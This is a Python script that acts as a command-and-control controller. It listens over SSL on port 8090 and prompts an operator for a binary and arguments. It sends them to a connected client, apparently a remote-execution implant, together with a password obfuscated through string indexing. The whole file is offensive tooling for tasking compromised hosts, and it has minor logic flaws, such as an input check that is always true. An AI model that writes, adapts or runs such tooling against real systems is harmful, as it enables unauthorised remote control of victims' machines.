#!/usr/bin/env python3

import socket
import ssl
from time import sleep

def GitSomStringStuff():
    a = "pDN9J}csry8eIPhQBotWUdg3Ci5LS=AZxjHOYfvKqMzb1l{4m20ERTknFGau6V7wX"
    return a[57]+a[23]+a[27]+a[37]+a[46]+a[20]+a[23]+a[52]+a[0]+a[6]+a[55]+a[4]+a[0]+a[43]+a[48]+a[21]+a[61]+a[6]+a[56]+a[52]+a[17]+a[31]+a[61]+a[16]+a[38]+a[21]+a[24]+a[51]+a[29]+a[5]
    

if __name__ == '__main__':
    while True:

        print("[-] Standing by for client connection...")   
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s = ssl.wrap_socket(s, server_side=False, keyfile="privkey.pem", certfile="certificate.pem")
            s.bind(("0.0.0.0",8090))
            print("[-] Listening on 8090")
            s.listen()
            conn, addr = s.accept()

            with conn:
                print("[!] Connection from ", addr)
                while True:
                    bin = input("[{}] Binary to execute: ".format(addr[0]))
                    args = input("[{}] Args to pass to binary: ".format(addr[0]))
                    if (len(bin) > 0) or (bin != ' '):
                        decision = ''
                        decision = input("[?] Execute {0} {1} ?[Y|n]: ".format(bin, args))
                        if (decision.lower() == 'n'):
                            continue
                        elif (decision.lower() != 'y'):
                            print("[!] Improper selection...")
                            continue
                        else:                               
                            print() 
                            try:                           
                                pw = GitSomStringStuff()
                                conn.sendall((pw+'^'+bin+'^'+args).encode())
                            except Exception as ex:
                                print(ex)
                                break
                        print("[*] task sent.")
                        break
                    else:
                        continue
    


